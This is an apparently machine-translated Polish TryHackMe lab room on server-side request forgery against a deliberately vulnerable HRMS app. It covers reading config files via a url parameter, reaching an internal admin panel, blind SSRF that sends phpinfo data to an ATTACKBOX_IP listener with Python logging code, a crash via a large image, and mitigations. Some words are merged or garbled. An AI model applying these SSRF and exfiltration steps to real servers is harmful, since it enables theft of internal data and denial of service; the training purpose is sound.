

![[Pasted image 20261006160959.png]]

Krajobraz ataków internetowych stale ewoluuje, a atakujący opracowują wyrafinowane metody włamywania się do systemów. Z każdym dniem rosnąca liczba zagrożeń internetowych wymusza konieczność stosowania **solidnych środków cyberbezpieczeństwa,** aby przeciwdziałać stale rozwijającym się taktykom stosowanym przez cyberprzestępców. W tej sali omówimy podobny atak, znany jako **Server Side Request Forgery (SFP).SSRF)** .

SSRF to luka w zabezpieczeniach aplikacji internetowych, która umożliwia atakującemu wymuszenie na serwerze wysyłania **nieautoryzowanych żądań do dowolnego źródła lokalnego lub zewnętrznego** w imieniu serwera internetowego. SSRF **umożliwia atakującemu interakcję z systemami wewnętrznymi** , co może prowadzić do wycieków danych, zakłóceń w działaniu usług, a nawet zdalnego wykonania kodu.  

Cele edukacyjne

- Zrozumienie działania SSRF
- Praktyczne testowanie różnych typów SSRF
- Kilka ważnych narzędzi do eksploatacji
- Kluczowe środki łagodzące i obronne

Wymagania wstępne dotyczące nauki  
Przed rozpoczęciem nauki w tym pokoju zaleca się ukończenie następujących zajęć:

- [Jak działają strony internetowe](https://tryhackme.com/room/howwebsiteswork)
- [Protokół i serwery](https://tryhackme.com/room/protocolsandservers)
- [OWASP10 najlepszych](https://tryhackme.com/room/owasptop10)

Łączenie się z maszyną.  
Możesz uruchomić maszynę laboratoryjną, klikając . W całej sali  `Start Lab Machine`będziemy korzystać z podatnej na ataki **aplikacji internetowej systemu zarządzania zasobami ludzkimi (HRMS)** , aby zrozumieć różne techniki SSRF. Poczekaj 2-3 minuty na pełne uruchomienie maszyny.

![Aplikacja internetowa HRMS podatna na ataki](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1910451b5490725491ba1f80e49ed8ed.svg)  

Dostęp do witryny HRMS można uzyskać, odwiedzając adres URL `http://hrms.thm`, ale najpierw trzeba dodać nazwę hosta do systemu operacyjnego lub AttackBox.

Dostęp do witryny HRMS można uzyskać, odwiedzając adres URL `http://hrms.thm`, ale najpierw trzeba dodać nazwę hosta do systemu operacyjnego lub AttackBox.

_Jak dodać nazwę hosta (kliknij, aby przeczytać)_

- Jeżeli łączysz się przez VPN lub AttackBox, możesz dodać nazwę hosta, `hrms.thm` najpierw otwierając plik hosta, zależnie od systemu operacyjnego hosta.  
    

- Okna:  `C:\Windows\System32\drivers\etc\hosts`
- Linux :`/etc/hosts`

- Otwórz plik hosta i dodaj nowy wiersz na końcu pliku w formacie:`MACHINE_IP hrms.thm`
- Zapisz plik i wpisz `http://hrms.thm`w przeglądarce, aby uzyskać dostęp do strony internetowej.

Zaczynajmy!

Podczas tworzenia oprogramowania sieciowego często wysyłane są żądania do serwerów zewnętrznych. Programiści często wykorzystują te żądania do **pobierania zdalnych zasobów,** takich jak aktualizacje oprogramowania, lub importowania danych z innych aplikacji. Chociaż te żądania są zazwyczaj bezpieczne, **nieprawidłowa implementacja może prowadzić do podatności znanej jakoSSRF**. 

Luka w zabezpieczeniach SSRF może powstać, gdy dane dostarczone przez użytkownika są wykorzystywane do konstruowania żądania, takiego jak utworzenie adresu URL. Aby przeprowadzić atak SSRF, **atakujący może manipulować wartością parametru w podatnym oprogramowaniu** , skutecznie tworząc lub kontrolując żądania z tego oprogramowania i kierując je do innych serwerów, a nawet do tego samego serwera.

Luki w zabezpieczeniach SSRF można znaleźć w różnych typach oprogramowania komputerowego, w szerokiej gamie języków programowania i na wielu platformach, pod warunkiem, że oprogramowanie działa w środowisku sieciowym. Chociaż większość luk w zabezpieczeniach SSRF jest powszechnie wykrywana w aplikacjach internetowych i innym oprogramowaniu sieciowym, mogą one również występować w oprogramowaniu serwerowym.

OWASP Zaszeregowanie

SSRF to poważne zagrożenie bezpieczeństwa, które znalazło się na [liście 10 najpoważniejszych zagrożeń OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) , co sprawia, że ​​zrozumienie go i obrona przed nim są konieczne, ponieważ zagraża on danymuczciwośći bezpieczeństwa aplikacji. Zgodnie z OWASP, czynniki dotyczące SSRF wymieniono poniżej:

|   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|
|**Maksymalna częstość występowania**|**Średni współczynnik zapadalności  <br>**|**Średnia ważona eksploatacja**|**Średni ważony wpływ  <br>**|**Maksymalny zasięg  <br>**|**Całkowita liczba wystąpień  <br>**|**Łączna liczba CVE**|
|2,72%|2,72%|8.28|6,72|67,2%|9503|385|

Powyższa tabela dostarcza informacji na temat **rozpowszechnienia, wpływu i zasięgu** luki w zabezpieczeniach SSRF w określonym kontekście lub zbiorze danych mierzonym przez OWASP. Interpretacja powyższej tabeli została wyjaśniona poniżej:

- **Maksymalny współczynnik występowania** : informuje, jak często ta luka została napotkana w porównaniu z innymi lukami w OWASP.
- **Średni współczynnik występowania** : pokazuje, jak powszechna jest ta podatność w porównaniu do innych.
- **Średnia ważona eksploatacja** : wskazuje średni poziom trudności lub wysiłku wymaganego do wykorzystania luki w zabezpieczeniach SSRF.
- **Średni ważony wpływ** : średni potencjalny wpływ lub dotkliwość wykorzystania luki w zabezpieczeniach SSRF.
- **Maksymalne pokrycie** : wskazuje, jaka część systemów została wykorzystana z powodu tej luki w zabezpieczeniach.
- **Łączna liczba wystąpień** : Łączna liczba przypadków wykorzystania tej luki w zabezpieczeniach, które przeanalizowała organizacja OWASP.
- **Łączna liczba CVE** : Łączna liczba CVE dotyczących SSRF. Oto one:CVE-2021-21311, CVE-2018-11759 i CVE-2017-9506. Dane OWASP pochodzą z 2021 roku.

**Uwaga** : luka SSRF zajmuje 7. miejsce w rankingu [OWASPAPI10 najważniejszych aspektów bezpieczeństwa](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/) .

Ryzyko SSRF  

**Ujawnienie danych**

Jak wyjaśniliśmy wcześniej, cyberprzestępcy mogą uzyskać nieautoryzowany dostęp, manipulując żądaniami w imieniu podatnej aplikacji internetowej, aby uzyskać dostęp do poufnych danych przechowywanych w sieci wewnętrznej.

**Rekonesans**

Atakujący może przeprowadzić skanowanie portów w sieciach wewnętrznych, uruchamiając złośliwe skrypty na podatnych serwerach lub przekierowując do skryptów umieszczonych na zewnętrznym serwerze.

  

**Odmowa usługi**

Często zdarza się, że sieci wewnętrzne lub serwery nie oczekują wielu żądań, dlatego są skonfigurowane do obsługi niskiej przepustowości. Atakujący mogą zalać serwery wieloma nieuprawnionymi żądaniami, uniemożliwiając im obsługę prawdziwych żądań.



﻿Podstawowy SSRF to technika ataku internetowego, w której atakujący oszukuje serwer, aby ten wysyłał żądania w jego imieniu, często atakując systemy wewnętrzne lub usługi stron trzecich. Wykorzystując luki w zabezpieczeniach walidacji danych wejściowych, atakujący może uzyskać nieautoryzowany dostęp do poufnych informacji lub kontrolę nad zdalnymi zasobami, co stanowi poważne zagrożenie bezpieczeństwa dla atakowanej aplikacji i jej infrastruktury.

Podstawowy SSRF można zastosować na serwerze lokalnym lub wewnętrznym. Omówimy szczegółowo oba scenariusze.

Scenariusz - I: SSRF przeciwko serwerowi lokalnemu  

W tym ataku atakujący wysyła nieautoryzowane żądanie do serwera hostującego aplikację internetową. Zazwyczaj podaje adres IP pętli zwrotnej lub adres localhost, aby otrzymać odpowiedź. Luka wynika ze sposobu, w jaki aplikacja obsługuje dane wejściowe z parametru zapytania lub API połączenia. 

Na przykład w aplikacji HRMS istnieje funkcja, która ładuje dodatkowe strony na podstawie parametru adresu URL. Na przykład przejście do strony `http://hrms.thm?url=localhost/copyright`spowoduje załadowanie strony z informacjami o prawach autorskich aplikacji. Funkcja ta jest przeznaczona do użytku wewnętrznego i służy do pobierania i wyświetlania stron z serwera lokalnego (a zatem do wykorzystania `localhost`w zapytaniu).

Jednak z powodu niewystarczającej walidacji wejściowego adresu URL, atakujący może manipulować tą funkcjonalnością w atakach SSRF. Zmieniając parametr adresu URL tak, aby wskazywał na inne strony/usługi, atakujący może zmusić serwer HRMS do wysyłania żądań do innych stron. Na przykład, jeśli atakujący użyje adresu URL takiego jak [adres URL] `http://hrms.thm/?url=localhost/config`i `config`będzie on prawidłową stroną, serwer HRMS spróbuje pobrać zawartość z tej strony i wyświetlić wynik. 

Głównym założeniem jest sfałszowanie uzasadnionego żądania i zmuszenie serwera do wykonania niezamierzonej akcji.  

**Jak to działa**

- Załóżmy, że otrzymałeś zadanie przeprowadzenia testów penetracyjnych witryny HRMS i zidentyfikowania luk w zabezpieczeniach SSRF. Odwiedź witrynę HRMS `http://hrms.thm`, a zobaczysz, że strona logowania jest zabezpieczona nazwą użytkownika i hasłem.

![jak zalogować się do aplikacji HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/07aeec8ece2fdc0a25ab67b527e35a47.png)  

- Zauważymy, że po odwiedzeniu strony`http://hrms.thm`[](http://hrms.thm/), automatycznie przekierowuje do `http://hrms.thm/?url=localhost/copyright`. Strona internetowa pokazuje status praw autorskich witryny.

![stopka ze statusem praw autorskich](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/08f69d021a9f881f75749e0ce21ae08f.png)

- Oznacza to, że programista prawdopodobnie popełnił błędy podczas obsługi pliku, który pokazuje status praw autorskich. Oto kod strony, która przyjmuje parametr zapytania.

Podatny skrypt

```shell-session
$uri = rtrim($_GET['url'], "/");
...					
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
  } else { ?>
    <p class="text-xl"><?= ltrim($file, "/") ?> is not found</p>
 <?php
... 
 
```

- W powyższym kodzie możemy zauważyć, że parametr wejściowy `url`nie posiada odpowiedniego filtrowania i ładuje wartość parametru podaną w pliku `localhost`.
- Spróbujmy zmienić adres URL z `http://hrms.thm/?url=localhost/copyright` na `http://hrms.thm/?url=localhost/hello`; wyświetli się komunikat o błędzie `hello.php is not found`.

![Kod pliku testowego hello.php](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8566f87e51f767f1bdfde449ac1018f1.png)

- Ooo! Więc strona wzywa kolejną PHP plik i wyświetla go w stopce bieżącej strony. Co jeśli nazwiemy pliki poufne, np `connection.php`. `config.php`?  
    
- Kiedy spróbujemy uzyskać dostęp do pliku `http://hrms.thm/?url=localhost/config`, zobaczymy, że stopka strony pokazuje zawartość pliku, pokazując nam w zasadzie dokładne dane uwierzytelniające, które wyglądają tak:

config.php

```shell-session
<?php 
$adminURL = "xxxxxxx";
$username = "xxxxx"; 
$password = "xxxx"; 
...
?>
```

W tym zadaniu dowiedzieliśmy się, jak drobny błąd podczas obsługi danych wejściowych z pliku może umożliwić atakującym przejęcie kontroli nad aplikacją. Jako tester penetracyjny, kluczowe jest, aby wiedzieć, że podstawowe luki w zabezpieczeniach SSRF często występują w różnych typach witryn internetowych, w tym w handlu elektronicznym, bankowości, systemach zarządzania i innych, szczególnie w funkcjach związanych z obsługą plików lub pobieraniem zasobów zewnętrznych.



W tym zadaniu będziemy kontynuować naukę podstaw SSRFtechniki i zagłębimy się w drugi scenariusz.  

Scenariusz II: Dostęp do serwera wewnętrznego

W złożonych aplikacjach internetowych często zdarza się, że aplikacje front-endowe (front-end) wchodzą w interakcję z wewnętrznymi serwerami back-end. Serwery te są zazwyczaj hostowane na **nieroutowalnych adresach IP** , co uniemożliwia użytkownikom internetu dostęp do nich. W tym scenariuszu atakujący wykorzystuje walidację danych wejściowych podatnej aplikacji internetowej, aby nakłonić serwer do żądania **zasobów wewnętrznych w tej samej sieci** . Może on podać złośliwy adres URL jako dane wejściowe, zmuszając serwer do interakcji z serwerem wewnętrznym w jego imieniu.

Na przykład, jeśli serwer wewnętrzny zapewnia zarządzanie bazą danych lub kontrolę administracyjną, atakujący może utworzyć adres URL, który inicjuje niezamierzoną akcję w tych systemach wewnętrznych po przetworzeniu przez podatną na atak aplikację internetową. Technicznie rzecz biorąc, odbywa się to poprzez zmanipulowane dane wejściowe, takie jak specjalne adresy IP (takie jak `192.168.x.x`lub `10.x.x.x`dla IPv4) lub nazwy domen (np. `internal-database.hrms.thm`). Jeśli dane te nie zostaną odpowiednio oczyszczone, mogą być wykorzystywane w funkcjach takich jak żądania HTTP lub pliki dołączane do aplikacji internetowej. Serwer, interpretując te żądania jako legalne, nieumyślnie wykonuje działania lub pobiera dane z innych usług wewnętrznych.

Co więcej, ponieważ te serwery wewnętrzne mogą nie posiadać takiego samego poziomu monitorowania bezpieczeństwa, jak serwery zewnętrzne, takie ataki często mogą pozostać niezauważone. Atakujący może również wykorzystać tę metodę do przeprowadzenia rekonesansu w sieci wewnętrznej, identyfikując inne podatne systemy lub usługi, które mogłyby zostać zaatakowane.  

**Jak to działa**

- W tym przypadku spróbujemy uzyskać dostęp do niedostępnych zasobów wewnętrznych poprzez bezpośrednie żądanie.
- Teraz, gdy mamy już dane logowania do panelu, zalogujemy się do pulpitu nawigacyjnego.
- Po zalogowaniu się do aplikacji internetowej HRMS, zobaczymy panel z listą pracowników i ich działów. Na liście rozwijanej znajdują się dane pracowników i ich wynagrodzenia.  
    

![Panel aplikacji HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/79c36e256f8be882f268675b1188b231.png)

- Z pliku konfiguracyjnego wynika, że ​​panel administracyjny jest hostowany pod adresem `http://192.168.2.10/admin.php`. Próba zalogowania się do panelu administracyjnego nie jest możliwa bezpośrednio. Spróbujmy uzyskać do niego dostęp, ale pojawi się błąd.

![niedostępny panel administracyjny](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ec6b8913193b20e30914d151620c3c4b.png)  

- Nie mamy możliwości dotarcia do tego adresu IP, ponieważ jest to prywatny adres IP sieciowy i dostęp do niego może uzyskać tylko komputer w tej samej sieci.
- Jeśli sprawdzimy kod HTML, okaże się, że lista rozwijana pobiera adres URL z **systemu wewnętrznego** i renderuje dane. Dane wszystkich pracowników są renderowane z pliku `http://192.168.2.10/employees.php`.

![Strona pracownika Strona internetowa HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0123917ba4d9d0f89131a586bdaf44e9.png)

- To świetnie, więc lista rozwijana uzyskuje dostęp do wewnętrznego systemu; co się stanie, gdy spróbujemy zmienić żądanie tak, aby zamiast ładować stronę pracownika, sfałszować żądanie i wysłać je `http://192.168.2.10/admin.php`jako parametr do serwera?
- Zróbmy to. Użyj opcji „Inspect Element” i zmień wartość „pension” z `http://192.168.2.10/salary.php` listy rozwijanej na „inspect `http://192.168.2.10/admin.php` ”, jak pokazano poniżej:

![Jak złożyć wniosek o fałszerstwo za pomocą listy rozwijanej](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9457320f0396c8ee6da80e44623c9212.png)  

- Po zaktualizowaniu wartości wybierz opcję  `Salary`z `Select Category`listy rozwijanej.

![Lista rozwijana wynagrodzeń](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/676320914b2d5c7c61896d634f400b95.png)  

- No i mamy dostęp do panelu administracyjnego, który wcześniej był niedostępny z tego samego adresu IP.

![dostęp do prywatnego panelu administracyjnego](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4713b3b463183dec150b81337e4d76f1.png)


﻿ŚlepySSRFOdnosi się do scenariusza, w którym atakujący może wysyłać żądania do serwera docelowego, ale nie otrzymuje bezpośrednich odpowiedzi ani informacji zwrotnej o wynikach swoich żądań. Innymi słowy, atakujący nie widzi odpowiedzi serwera. Ten typ SSRF może być trudniejszy do wykorzystania, ponieważ atakujący nie widzi bezpośrednio rezultatów swoich działań. Omówimy różne przykłady.

Ślepy SSRF z poza pasmem 

SSRF poza pasmem to technika, w której atakujący wykorzystuje oddzielny, poza pasmem kanał komunikacyjny zamiast bezpośrednio odbierać odpowiedzi z serwera docelowego, aby uzyskać informacje lub kontrolować eksploatowany serwer. To podejście jest praktyczne, gdy atakujący nie ma bezpośredniego dostępu do odpowiedzi serwera.

Na przykład atakujący może manipulować podatnym serwerem, aby utworzyćDNSżądanie skierowane do domeny, której jest właścicielem, lub nawiązanie połączenia z serwerem zewnętrznym z określonymi danymi. Ta zewnętrzna interakcja dostarcza atakującemu dowodu na istnienie luki w zabezpieczeniach SSRF i potencjalnie pozwala mu zebrać dodatkowe informacje, takie jak wewnętrzne adresy IP lub strukturę sieci wewnętrznej.  

**Jak to działa**

- Ponownie zaloguj się do pulpitu nawigacyjnego i kliknij `Profile`zakładkę na pasku nawigacyjnym.  Zobaczysz, że przekierowuje ona do `http://hrms.thm/profile.php?url=localhost/getInfo.php`, gdzie wyświetla się komunikat o wysyłaniu danych.

![strona profilu w aplikacji HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0ef2a2a8940fb66215b3c543e2d89134.png)  

- Co się tu dzieje?  Po załadowaniu `profile.php`dane są wysyłane na zewnętrzną stronę o nazwie `getInfo.php`, która prawdopodobnie służy do analiz lub rejestrowania logów.

profil.php

```shell-session
<?php
...
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```

- Analiza kodu źródłowego strony pokazuje, że strona odczytuje `url`parametry i bez przeprowadzania żadnej walidacji wysyła informacje do serwera podanego w `url`parametrze. 
- W tym przypadku atakujący może przekierować żądanie do swojego serwera, uzyskując w ten sposób dodatkowe informacje, które mogą zostać wykorzystane do celów przestępczych lub kradzieży danych. 
- W AttackBoxie utwórz nowy plik o nazwie `server.py` i dodaj do niego następujący kod:  
    

server.py

```shell-session
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

- Powyższy kod pobierze całą zawartość i zapisze ją do pliku data.html na serwerze.  Aby uzyskać dane, musimy najpierw uruchomić lekki serwer . Możemy to zrobić `AttackBox`za pomocą następujących poleceń:

AttackBox - Terminal

```shell-session
thm@machine$ sudo chmod +x server.py && sudo python3 server.py
```

- Teraz otwórz przeglądarkę i otwórz plik `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080`, który zapisze dane w pliku `data.html`. Otwórz `data.html` plik, który zawiera wszystkie istotne informacje dotyczące serwera, które mogą zostać wykorzystane do przeprowadzenia dalszych ataków.

![Przechwycony obraz pliku](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8f499d3348f74b47f9f647a63041ae81.png)

Półślepy SSRF (oparty na czasie)  

SSRF oparty na czasie to odmiana SSRF, w której atakujący wykorzystuje wskazówki związane z czasem lub opóźnienia, aby wnioskować o powodzeniu lub niepowodzeniu swoich złośliwych żądań. Obserwując **czas reakcji aplikacji** , atakujący może trafnie szacować, czy jego atak SSRF zakończył się sukcesem. 

Atakujący wysyła serię żądań, z których każde dotyczy innego zasobu lub adresu URL. Atakujący mierzy czas odpowiedzi dla każdego żądania. Jeśli odpowiedź trwa znacznie dłużej, może to oznaczać, że serwer pomyślnie uzyskał dostęp do docelowego zasobu, co oznacza udany atak SSRF.


Atakujący może nadużyćSSRFpoprzez awarię serwera lub utworzenie odmowy usługi dla innych hostów.  Istnieje wiele przypadków ( [WordPress](https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/) , [CairoSVG](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv) ), w których atakujący próbują zakłócić dostępność systemu, uruchamiając ataki SSRF. 

Awaria serwera  

W tej demonstracji SSRF pokażemy, jak atakujący może wykorzystać aplikację internetową do spowodowania odmowy usługi na serwerze. W naszym scenariuszu luka jest wykorzystywana poprzez podanie złośliwego adresu URL wskazującego na zasób, który po uzyskaniu dostępu przez serwer prowadzi do nadmiernego zużycia zasobów lub awarii.

Na przykład atakujący może wprowadzić adres URL prowadzący do dużego pliku na powolnym serwerze lub usługi, która odpowiada przytłaczającą ilością danych. Gdy podatna aplikacja naiwnie uzyska dostęp do tego adresu URL, podejmie działanie, które wyczerpie jej własne zasoby systemowe, co doprowadzi do spowolnienia lub całkowitej awarii.

**Jak to działa**

- Po zalogowaniu się do pulpitu nawigacyjnego zobaczymy zakładkę `Training`na pasku nawigacyjnym, która służy do ładowania treści szkoleniowych dla pracowników.
- Po kliknięciu tej zakładki zobaczymy, że przekierowuje ona do adresu URL`http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`[](http://hrms.thm/url.php=10.10.19.1/trainingbanner.jpg), który pokazuje treści szkoleniowe.

![strona z treściami szkoleniowymi na stronie HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/57fae798d14a3defe4c057d3926dd49d.png)  

- Zauważamy, że `url.php`plik ładuje wyświetlaną tutaj zawartość zewnętrzną. Co się stanie, jeśli spróbujemy załadować inną zawartość?
- Spróbuj otworzyć plik `http://hrms.thm/url.php?id=10.10.10.10`. Świetnie! – plik został otwarty. 

![Dostęp do strony 10.10.10.10 poprzez SSRF](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1254a5139518aff6b8d898889e4cde3f.png)  

- Teraz, gdy wiemy, że serwer jest podatny na podstawowe ataki SSRF, przyjrzyjmy się kodowi, który `url.php`powoduje awarię serwera.
- Po wejściu na adres URL  `http://hrms.thm/?url=localhost/url`w stopce zobaczymy następujący kod (działa tylko, jeśli użytkownik nie jest zalogowany).

url.php

```shell-session
<?php
....
....
    if ($imageSize < 100) {
		  // Output the image if it's within the size limit
    
		$base64Image = downloadAndEncodeImage($imageUrl);
        echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';

    } else {
	 	// Memory Outage - server will crash
    
....
...
```

- Powyższy kod pokazuje, że `url.php`ładuje się obraz; jeśli rozmiar obrazu przekroczy  `100KB`, wyświetla się komunikat o braku pamięci i zgłasza błąd.
- Spróbujmy spowodować awarię serwera, wczytując obraz większy niż 100 KB. Dla Twojej wygody mamy już taki obraz, który możesz podrobić za pomocą `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.

![Serwer uległ awarii obrazu HRMS](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/580c0061fcddddc03dfe7ecb168d452b.png)

  

Widzimy, że zagrożenie wynikające z luk w zabezpieczeniach SSRF wykracza poza nieautoryzowany dostęp do danych lub narażenie sieci wewnętrznej; obejmuje ono również możliwość zakłócenia lub całkowitego unieruchomienia krytycznych operacji serwera. Manipulując podatnym serwerem w celu wysyłania niezamierzonych żądań, atakujący mogą przeciążyć system, co prowadzi do awarii skutkujących odmową usługi.


Środki łagodzące dlaSSRFsą niezbędne do zachowania bezpieczeństwa iuczciwośćaplikacji internetowych. Wdrożenie solidnych środków ograniczających ryzyko SSRF pomaga chronić się przed tymi zagrożeniami poprzez wzmocnienie mechanizmów obronnych aplikacji, zapobieganie złośliwym żądaniom i poprawę ogólnego poziomu bezpieczeństwa. Jako kluczowy element bezpieczeństwa aplikacji internetowych, środki ograniczające ryzyko SSRF odgrywają kluczową rolę w ochronie danych użytkowników, ochronie przed naruszeniami danych i utrzymaniu zaufania do ekosystemu cyfrowego. Poniżej wymieniono kilka ważnych zasad:

![Różne techniki łagodzenia](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/24147651267eedd828e4c103b84795d9.svg)  

- **Wprowadź rygorystyczną walidację danych wejściowych** i oczyść wszystkie dane wprowadzane przez użytkownika, zwłaszcza adresy URL i parametry wejściowe, których aplikacja używa do wysyłania żądań zewnętrznych.
- Zamiast próbować blokować lub filtrować niedozwolone adresy URL, **utrzymuj listy dozwolonych adresów URL lub domen, które są zaufane** . Zezwalaj tylko na żądania kierowane do tych zaufanych źródeł.
- **Wdrożenie siecisegmentacja**w celu odizolowania wrażliwych zasobów wewnętrznych od dostępu z zewnątrz.
- **Wdróż nagłówki zabezpieczeń** , takie jak Content-Security-Policy, które ograniczą obciążenie aplikacji zasobami zewnętrznymi.  
    
- **Wprowadź solidne kontrole dostępu** do zasobów wewnętrznych, dzięki czemu nawet jeśli atakujący zdoła wysłać żądanie, nie będzie mógł uzyskać dostępu do poufnych danych bez odpowiedniego upoważnienia.
- **Wdróż kompleksowe rejestrowanie i monitorowanie** , aby śledzić i analizować przychodzące żądania. Szukaj nietypowych lub nieautoryzowanych żądań i skonfiguruj alerty dotyczące podejrzanej aktywności.

W tym pokoju omówiliśmy szczegółySSRFJednocześnie rzucając światło na techniki podstawowe, ślepe i oparte na czasie. Celem tej sali było zapewnienie Państwu kompleksowego zrozumienia tej podatności w aplikacjach internetowych poprzez ćwiczenia praktyczne i scenariusze z życia codziennego. Ponadto omówiliśmy również środki zaradcze chroniące przed podatnością.

Bądź na bieżąco, aby poznać więcej szczegółów, aktualności i ciekawych treści na temat zaawansowanych ataków po stronie serwera.